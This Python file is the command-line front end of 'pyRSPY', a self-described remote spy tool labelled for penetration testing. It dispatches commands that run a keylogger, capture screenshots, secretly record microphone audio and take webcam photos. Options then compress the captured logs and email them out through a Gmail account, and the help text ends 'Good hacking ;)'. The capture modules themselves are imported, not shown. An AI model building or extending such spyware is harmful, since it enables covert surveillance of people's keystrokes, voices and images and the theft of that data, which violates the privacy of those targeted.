import argparse
import getpass
import sys
from pathlib import Path
from log import custom_path
from Commands.keylogger import keylogger
from Commands.scrshot import screenshot
from Commands.audio import CapAudio
from Commands.webcam import check_for_fswebcam, cap_webcam_footage
from Optional.archive import Archive
from Optional.lmail import SendEmail


def mail():
    password = getpass.getpass('Please enter your password: ')
    SendEmail(args.email[0], args.email[1], password).send_mail()


# Create main parser
parser = argparse.ArgumentParser(
    prog='lat',
    usage='python3 pyrspy.py [OPTIONS] [COMMAND] [COMMAND OPTIONS]',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description='''
pyRSPY - Python Remote Spy.
A command line tool for penetration testing.

example usage: python3 pyrspy.py -P [PATH] runkeylogger
               python3 pyrspy.py eavesdrop
               python3 pyrspy.py takeshot -t 3 -s 2
               
useful notes: To terminate the keylogger press shift + esc + backspace
              
''',
    allow_abbrev=False,
    epilog='Good hacking ;)')

# LAT arguments
parser.add_argument(
    '-P', '--path',
    metavar='path',
    help='sets the path for the logs')

parser.add_argument(
    '--archive',
    nargs=2,
    metavar=('src', 'dest'),
    help='compresses the captured logs')

parser.add_argument(
    '--email',
    nargs=2,
    metavar=('path', 'gmail'),
    help='sends the logs file via email')

parser.version = 'LAT 1.0'
parser.add_argument(
    '-V', '--version',
    action='version',
    help="show the program's version and exit")

# Create the subparser
subparser = parser.add_subparsers(
    dest='subcommand')

# Create parser for the keylogger
keylogger_parser = subparser.add_parser(
    'runkeylogger',
    add_help=False,
    help='runs the keylogger')

# Create parser for the screenshot
screenshot_parser = subparser.add_parser(
    'takeshot',
    usage='python3 lat.py takeshot [OPTIONS]',
    allow_abbrev=False,
    help='captures a screenshot')

# Screenshot arguments
screenshot_parser.add_argument(
    '-t', '--times',
    type=int,
    metavar='int',
    help='how many screenshots to take')

screenshot_parser.add_argument(
    '-s',
    type=int,
    metavar='int',
    help='sets the seconds delay '
         'between each screenshot')

# Create parser for the audio
audio_parser = subparser.add_parser(
    'eavesdrop',
    usage='python3 lat.py eavesdrop [OPTIONS]',
    allow_abbrev=False,
    help='records an audio in wav format')

# Eavesdrop arguments
audio_parser.add_argument(
    '-s',
    type=int,
    metavar='int',
    help='sets the seconds for '
         'the audio duration')

# Create parser for the webcam
webcam_parser = subparser.add_parser(
    'saycheese',
    allow_abbrev=False,
    help='captures a photo from the webcam')

# Webcam arguments
webcam_parser.add_argument(
    '-t', '--times',
    type=int,
    metavar='int',
    help='how many photos to take')

webcam_parser.add_argument(
    '-s',
    type=int,
    metavar='int',
    help='sets the seconds delay '
         'between each photo')

# Parse the arguments
args = parser.parse_args()

print(args)

# No arguments checking
if len(sys.argv) < 2:
    parser.print_help()
# Path checking
if args.path is not None:
    custom_path.set_path(args.path)
# Positional arguments checking
if args.subcommand == 'runkeylogger':
    if args.path is None:
        custom_path.set_path(Path('Data') / 'logs.txt')
    keylogger()
elif args.subcommand == 'takeshot':
    if args.times is None and args.s is None:
        screenshot()
    elif args.times is not None:
        screenshot(args.times, args.s)
elif args.subcommand == 'eavesdrop':
    if args.s is None:
        CapAudio().start()
    else:
        CapAudio(args.path, args.s).start()
elif args.subcommand == 'saycheese':
    check_for_fswebcam()
    if args.times is None and args.s is None:
        cap_webcam_footage()
    elif args.times is not None:
        cap_webcam_footage(args.times, args.s)
# Optional arguments checking
if args.archive is not None:
    Archive(args.archive[0], args.archive[1]).archive()
if args.email is not None:
    mail()
